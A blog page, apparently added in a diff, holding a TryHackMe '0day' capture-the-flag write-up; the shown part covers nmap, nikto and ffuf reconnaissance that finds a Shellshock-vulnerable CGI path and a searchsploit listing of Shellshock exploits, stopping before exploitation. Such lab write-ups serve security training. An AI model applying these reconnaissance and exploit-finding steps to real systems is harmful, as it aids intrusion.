@@ -1,0 +1,1092 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.20.2 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>TryHackMe - 0day | Tri Wanda Septian’s Blog</title>
+<meta name="description" content="This room was created by 0day, we can access on the tryhackme. 0day machine has a famous vulnerability called Shell Shock CVE-2014-6278 2014-6271, and from the machine teach us how to enumerate using nikto, how to exploit cgi-bin path, and how to escalate privilege access use &#39;overlayfs&#39; Local Privilege Escalation(CVE-2015-1328).">
+
+
+  <meta name="author" content="Tri Wanda Septian">
+  
+  <meta property="article:author" content="Tri Wanda Septian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Tri Wanda Septian's Blog">
+<meta property="og:title" content="TryHackMe - 0day">
+<meta property="og:url" content="http://localhost:4000/tryhackme/thm-0day/">
+
+
+  <meta property="og:description" content="This room was created by 0day, we can access on the tryhackme. 0day machine has a famous vulnerability called Shell Shock CVE-2014-6278 2014-6271, and from the machine teach us how to enumerate using nikto, how to exploit cgi-bin path, and how to escalate privilege access use &#39;overlayfs&#39; Local Privilege Escalation(CVE-2015-1328).">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/avatar_backup.png">
+
+
+
+  <meta name="twitter:site" content="@twseptian_">
+  <meta name="twitter:title" content="TryHackMe - 0day">
+  <meta name="twitter:description" content="This room was created by 0day, we can access on the tryhackme. 0day machine has a famous vulnerability called Shell Shock CVE-2014-6278 2014-6271, and from the machine teach us how to enumerate using nikto, how to exploit cgi-bin path, and how to escalate privilege access use &#39;overlayfs&#39; Local Privilege Escalation(CVE-2015-1328).">
+  <meta name="twitter:url" content="http://localhost:4000/tryhackme/thm-0day/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="http://localhost:4000/assets/images/avatar_backup.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-08-01T00:00:00+07:00">
+
+
+
+  <meta property="article:modified_time" content="2021-08-01T14:58:26+07:00">
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/tryhackme/thm-0day/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Tri Wanda Septian's Blog and Stuff",
+      "url": "http://localhost:4000/",
+      "sameAs": ["https://twitter.com/twsepian_","https://github.com/twseptian"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="KJV9Ip5Mlud9lmDhN6pzfrcplPaoPSnsaOptFO6aIwE" />
+
+
+  <meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3">
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Tri Wanda Septian's Blog Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+
+    <!-- start custom head snippets -->
+<meta name="msvalidate.01" content="A990426F952EA8940B6F2C13C11817E3" />
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="apple-touch-icon" sizes="120x120" href="/assets/images/favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/images/favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/assets/images/favicon/favicon-16x16.png">
+<link rel="manifest" href="/assets/images/favicon/site.webmanifest">
+<link rel="mask-icon" href="/assets/images/favicon/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/ava.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          Tri Wanda Septian
+          <span class="site-subtitle">#neverstoplearning #lifelonglearning</span>
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/">posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/">about me</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+    
+    <aside class="sidebar__top">
+      <a href="#site-nav"><i class="fas fa-chevron-circle-up fa-2x"></i></a>
+      </aside>
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/avatar_backup.png" alt="Tri Wanda Septian" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Tri Wanda Septian</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Researcher, Infosec practioner,<br />CTF Player, Perpetual Learner.</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Indonesia</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://twseptian.github.io" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="mailto:twseptian@gmail.com" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-envelope" aria-hidden="true"></i><span class="label">Email</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/twseptian" rel="nofollow noopener noreferrer"><i class="fab fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://gitlab.com/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-gitlab" aria-hidden="true"></i><span class="label">GitLab</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/twseptian_" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://www.linkedin.com/in/twseptian/" rel="nofollow noopener noreferrer"><i class="fab fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="TryHackMe - 0day">
+    <meta itemprop="description" content="This room was created by 0day, we can access on the tryhackme. 0day machine has a famous vulnerability called Shell Shock CVE-2014-6278 2014-6271, and from the machine teach us how to enumerate using nikto, how to exploit cgi-bin path, and how to escalate privilege access use &#39;overlayfs&#39; Local Privilege Escalation(CVE-2015-1328).">
+    <meta itemprop="datePublished" content="2021-08-01T00:00:00+07:00">
+    <meta itemprop="dateModified" content="2021-08-01T14:58:26+07:00">
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">TryHackMe - 0day
+</h1>
+          
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-08-01T00:00:00+07:00">August 1, 2021</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+
+          <section class="page__share">
+  
+    <!--<h4 class="page__share-title">Share on</h4>-->
+  
+
+  <a href="https://twitter.com/intent/tweet?via=twseptian_&text=TryHackMe+-+0day%20http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-0day%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-0day%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Ftryhackme%2Fthm-0day%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i></a>
+  
+  <a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=☕&slug=twseptian&button_colour=5F7FFF&font_colour=ffffff&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="160",height="160"></a>
+</section>
+
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#network-scanning">Network Scanning</a></li>
+  <li><a href="#enumeration">Enumeration</a></li>
+  <li><a href="#gaining-access">Gaining Access</a></li>
+  <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <p>This room was created by 0day, we can access on the <a href="https://tryhackme.com/room/0day">tryhackme</a>. 0day machine has a famous vulnerability called <code class="language-plaintext highlighter-rouge">Shell Shock CVE-2014-6278 2014-6271</code>, and from the machine teach us how to enumerate using <code class="language-plaintext highlighter-rouge">nikto</code>, how to exploit <code class="language-plaintext highlighter-rouge">cgi-bin</code> path, and how to escalate privilege access use <code class="language-plaintext highlighter-rouge">'overlayfs' Local Privilege Escalation(CVE-2015-1328)</code>.</p>
+
+<h1 id="network-scanning">Network Scanning</h1>
+<p>First, we need to find open ports, services from the target machine using command <code class="language-plaintext highlighter-rouge">sudo nmap -sC -sV -T4 -A --vv 10.10.26.88 -oN nmap_0day</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-T4</span> <span class="nt">-A</span> <span class="nt">--vv</span> 10.10.26.88 <span class="nt">-oN</span> nmap_0day
+<span class="c"># Nmap 7.91 scan initiated Sun Aug  1 17:37:16 2021 as: nmap -sC -sV -T4 -A --vv -oN nmap_0day 10.10.26.88</span>
+Nmap scan report <span class="k">for </span>10.10.26.88
+Host is up, received echo-reply ttl 61 <span class="o">(</span>0.39s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-08-01 17:37:16 WIB <span class="k">for </span>61s
+Not shown: 998 closed ports
+Reason: 998 resets
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 61 OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c <span class="o">(</span>DSA<span class="o">)</span>
+| ssh-dss AAAAB3NzaC1kc3MAAACBAPcMQIfRe52VJuHcnjPyvMcVKYWsaPnADsmH+FR4OyR5lMSURXSzS15nxjcXEd3i9jk14amEDTZr1zsapV1Ke2Of/n6V5KYoB7p7w0HnFuMriUSWStmwRZCjkO/LQJkMgrlz1zVjrDEANm3fwjg0I7Ht1/gOeZYEtIl9DRqRzc1ZAAAAFQChwhLtInglVHlWwgAYbni33wUAfwAAAIAcFv6QZL7T2NzBsBuq0RtlFux0SAPYY2l+PwHZQMtRYko94NUv/XUaSN9dPrVKdbDk4ZeTHWO5H6P0t8LruN/18iPqvz0OKHQCgc50zE0pTDTS+GdO4kp3CBSumqsYc4nZsK+lyuUmeEPGKmcU6zlT03oARnYA6wozFZggJCUG4QAAAIBQKMkRtPhl3pXLhXzzlSJsbmwY6bNRTbJebGBx6VNSV3imwPXLR8VYEmw3O2Zpdei6qQlt6f2S3GaSSUBXe78h000/JdckRk6A73LFUxSYdXl1wCiz0TltSogHGYV9CxHDUHAvfIs5QwRAYVkmMe2H+HSBc3tKeHJEECNkqM2Qiw<span class="o">==</span>
+|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b <span class="o">(</span>RSA<span class="o">)</span>
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwY8CfRqdJ+C17QnSu2hTDhmFODmq1UTBu3ctj47tH/uBpRBCTvput1+++BhyvexQbNZ6zKL1MeDq0bVAGlWZrHdw73LCSA1e6GrGieXnbLbuRm3bfdBWc4CGPItmRHzw5dc2MwO492ps0B7vdxz3N38aUbbvcNOmNJjEWsS86E25LIvCqY3txD+Qrv8+W+Hqi9ysbeitb5MNwd/4iy21qwtagdi1DMjuo0dckzvcYqZCT7DaToBTT77Jlxj23mlbDAcSrb4uVCE538BGyiQ2wgXYhXpGKdtpnJEhSYISd7dqm6pnEkJXSwoDnSbUiMCT+ya7yhcNYW3SKYxUTQzIV
+|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d <span class="o">(</span>ECDSA<span class="o">)</span>
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKF5YbiHxYqQ7XbHoh600yn8M69wYPnLVAb4lEASOGH6l7+irKU5qraViqgVR06I8kRznLAOw6bqO2EqB8EBx+E<span class="o">=</span>
+|   256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 <span class="o">(</span>ED25519<span class="o">)</span>
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIItaO2Q/3nOu5T16taNBbx5NqcWNAbOkTZHD2TB1FcVg
+80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: 0day
+OS fingerprint not ideal because: maxTimingRatio <span class="o">(</span>1.854000e+00<span class="o">)</span> is greater than 1.4
+Aggressive OS guesses: Linux 3.10 - 3.13 <span class="o">(</span>95%<span class="o">)</span>, Linux 5.4 <span class="o">(</span>95%<span class="o">)</span>, ASUS RT-N56U WAP <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>95%<span class="o">)</span>, Linux 3.16 <span class="o">(</span>95%<span class="o">)</span>, Linux 3.1 <span class="o">(</span>93%<span class="o">)</span>, Linux 3.2 <span class="o">(</span>93%<span class="o">)</span>, AXIS 210A or 211 Network Camera <span class="o">(</span>Linux 2.6.17<span class="o">)</span> <span class="o">(</span>92%<span class="o">)</span>, Sony Android TV <span class="o">(</span>Android 5.0<span class="o">)</span> <span class="o">(</span>92%<span class="o">)</span>, Android 5.0 - 6.0.1 <span class="o">(</span>Linux 3.4<span class="o">)</span> <span class="o">(</span>92%<span class="o">)</span>, Android 5.1 <span class="o">(</span>92%<span class="o">)</span>
+No exact OS matches <span class="k">for </span>host <span class="o">(</span><span class="nb">test </span>conditions non-ideal<span class="o">)</span><span class="nb">.</span>
+TCP/IP fingerprint:
+SCAN<span class="o">(</span><span class="nv">V</span><span class="o">=</span>7.91%E<span class="o">=</span>4%D<span class="o">=</span>8/1%OT<span class="o">=</span>22%CT<span class="o">=</span>1%CU<span class="o">=</span>32594%PV<span class="o">=</span>Y%DS<span class="o">=</span>4%DC<span class="o">=</span>T%G<span class="o">=</span>N%TM<span class="o">=</span>61067999%P<span class="o">=</span>x86_64-pc-linux-gnu<span class="o">)</span>
+SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>104%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%II<span class="o">=</span>I%TS<span class="o">=</span>8<span class="o">)</span>
+SEQ<span class="o">(</span><span class="nv">SP</span><span class="o">=</span>104%GCD<span class="o">=</span>1%ISR<span class="o">=</span>108%TI<span class="o">=</span>Z%CI<span class="o">=</span>I%TS<span class="o">=</span>8<span class="o">)</span>
+OPS<span class="o">(</span><span class="nv">O1</span><span class="o">=</span>M505ST11NW6%O2<span class="o">=</span>M505ST11NW6%O3<span class="o">=</span>M505NNT11NW6%O4<span class="o">=</span>M505ST11NW6%O5<span class="o">=</span>M505ST11NW6%O6<span class="o">=</span>M505ST11<span class="o">)</span>
+WIN<span class="o">(</span><span class="nv">W1</span><span class="o">=</span>68DF%W2<span class="o">=</span>68DF%W3<span class="o">=</span>68DF%W4<span class="o">=</span>68DF%W5<span class="o">=</span>68DF%W6<span class="o">=</span>68DF<span class="o">)</span>
+ECN<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>6903%O<span class="o">=</span>M505NNSNW6%CC<span class="o">=</span>Y%Q<span class="o">=)</span>
+T1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%S<span class="o">=</span>O%A<span class="o">=</span>S+%F<span class="o">=</span>AS%RD<span class="o">=</span>0%Q<span class="o">=)</span>
+T2<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>
+T3<span class="o">(</span><span class="nv">R</span><span class="o">=</span>N<span class="o">)</span>
+T4<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>
+T5<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>
+T6<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>A%A<span class="o">=</span>Z%F<span class="o">=</span>R%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>
+T7<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>Y%T<span class="o">=</span>40%W<span class="o">=</span>0%S<span class="o">=</span>Z%A<span class="o">=</span>S+%F<span class="o">=</span>AR%O<span class="o">=</span>%RD<span class="o">=</span>0%Q<span class="o">=)</span>
+U1<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DF<span class="o">=</span>N%T<span class="o">=</span>40%IPL<span class="o">=</span>164%UN<span class="o">=</span>0%RIPL<span class="o">=</span>G%RID<span class="o">=</span>G%RIPCK<span class="o">=</span>G%RUCK<span class="o">=</span>G%RUD<span class="o">=</span>G<span class="o">)</span>
+IE<span class="o">(</span><span class="nv">R</span><span class="o">=</span>Y%DFI<span class="o">=</span>N%T<span class="o">=</span>40%CD<span class="o">=</span>S<span class="o">)</span>
+
+Uptime guess: 204.567 days <span class="o">(</span>since Sat Jan  9 04:01:07 2021<span class="o">)</span>
+Network Distance: 4 hops
+TCP Sequence Prediction: <span class="nv">Difficulty</span><span class="o">=</span>258 <span class="o">(</span>Good luck!<span class="o">)</span>
+IP ID Sequence Generation: All zeros
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE <span class="o">(</span>using port 53/tcp<span class="o">)</span>
+HOP RTT       ADDRESS
+1   254.58 ms 10.2.0.1
+2   ... 3
+4   381.57 ms 10.10.26.88
+
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sun Aug  1 17:38:17 2021 -- 1 IP address (1 host up) scanned in 61.33 seconds</span>
+</code></pre></div></div>
+<p>From nmap’s result we found two tcp open ports includes the services</p>
+
+<h1 id="enumeration">Enumeration</h1>
+<p><strong>Port 22</strong> from nmap result gave the information about version <code class="language-plaintext highlighter-rouge">OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)</code>, but the version was not has a vulnerability, so we need to look forward to the port 80</p>
+
+<p><strong>Port 80</strong> is another open port from target machine with web technology using <code class="language-plaintext highlighter-rouge">Apache httpd 2.4.7 ((Ubuntu))</code>. The version of web server tecnology was not vulnerable. Next step is we need to enumerate information deeply using <code class="language-plaintext highlighter-rouge">nikto</code> and enumerate directory using <code class="language-plaintext highlighter-rouge">ffuf</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nikto <span class="nt">-host</span> 10.10.26.88                 
+- Nikto v2.1.6
+<span class="nt">---------------------------------------------------------------------------</span>
++ Target IP:          10.10.26.88
++ Target Hostname:    10.10.26.88
++ Target Port:        80
++ Start Time:         2021-08-01 17:38:10 <span class="o">(</span>GMT7<span class="o">)</span>
+<span class="nt">---------------------------------------------------------------------------</span>
++ Server: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class="k">in </span>a different fashion to the MIME <span class="nb">type</span>
++ Apache/2.4.7 appears to be outdated <span class="o">(</span>current is at least Apache/2.4.37<span class="o">)</span><span class="nb">.</span> Apache 2.2.34 is the EOL <span class="k">for </span>the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: <span class="nb">gzip</span>
++ Uncommon header <span class="s1">'93e4r0-cve-2014-6278'</span> found, with contents: <span class="nb">true</span>
++ OSVDB-112004: /cgi-bin/test.cgi: Site appears vulnerable to the <span class="s1">'shellshock'</span> vulnerability <span class="o">(</span>http://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2014-6271<span class="o">)</span><span class="nb">.</span>
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3092: /admin/: This might be interesting...
++ OSVDB-3092: /backup/: This might be interesting...
++ OSVDB-3268: /css/: Directory indexing found.
++ OSVDB-3092: /css/: This might be interesting...
++ OSVDB-3268: /img/: Directory indexing found.
++ OSVDB-3092: /img/: This might be interesting...
++ OSVDB-3092: /secret/: This might be interesting...
++ OSVDB-3092: /cgi-bin/test.cgi: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ ERROR: Error limit <span class="o">(</span>20<span class="o">)</span> reached <span class="k">for </span>host, giving up. Last error: opening stream: can<span class="s1">'t connect (timeout): Operation now in progress
++ Scan terminated:  19 error(s) and 17 item(s) reported on remote host
++ End Time:           2021-08-01 18:20:49 (GMT7) (2559 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</span></code></pre></div></div>
+<p>From <code class="language-plaintext highlighter-rouge">nikto</code> result we found directory/path <code class="language-plaintext highlighter-rouge">/cgi-bin/test.cgi</code>, and nikto detected it a <code class="language-plaintext highlighter-rouge">shell shock</code> vulnerability.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ffuf <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://10.10.26.88/FUZZ <span class="nt">-mc</span> 200,301,302 <span class="nt">-e</span> .php,.txt,.html <span class="nt">-fs</span> 3025
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.0-git
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.26.88/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Extensions       : .php. txt. html 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,301,302
+ :: Filter           : Response size: 3025
+________________________________________________
+
+cgi-bin                 [Status: 301, Size: 311, Words: 20, Lines: 10]
+img                     [Status: 301, Size: 307, Words: 20, Lines: 10]
+uploads                 [Status: 301, Size: 311, Words: 20, Lines: 10]
+admin                   [Status: 301, Size: 309, Words: 20, Lines: 10]
+css                     [Status: 301, Size: 307, Words: 20, Lines: 10]
+js                      [Status: 301, Size: 306, Words: 20, Lines: 10]
+backup                  [Status: 301, Size: 310, Words: 20, Lines: 10]
+secret                  [Status: 301, Size: 310, Words: 20, Lines: 10]
+</span></code></pre></div></div>
+<p>The result from <code class="language-plaintext highlighter-rouge">ffuf</code>, we found “interesting” directories/paths, but we focused on <code class="language-plaintext highlighter-rouge">shellshock</code> with the vulnerable path is <code class="language-plaintext highlighter-rouge">/cgi-bin/test.cgi</code>. Let’s search the <code class="language-plaintext highlighter-rouge">shellshock</code> exploit script using <code class="language-plaintext highlighter-rouge">searchploit</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>searchsploit shellshock                            
+<span class="nt">--------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                  |  Path
+<span class="nt">--------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Advantech Switch - <span class="s1">'Shellshock'</span> Bash Environment Variable Command Injection <span class="o">(</span>Me | cgi/remote/38849.rb
+Apache mod_cgi - <span class="s1">'Shellshock'</span> Remote Command Injection                          | linux/remote/34900.py
+Bash - <span class="s1">'Shellshock'</span> Environment Variables Command Injection                     | linux/remote/34766.php
+Bash CGI - <span class="s1">'Shellshock'</span> Remote Command Injection <span class="o">(</span>Metasploit<span class="o">)</span>                   | cgi/webapps/34895.rb
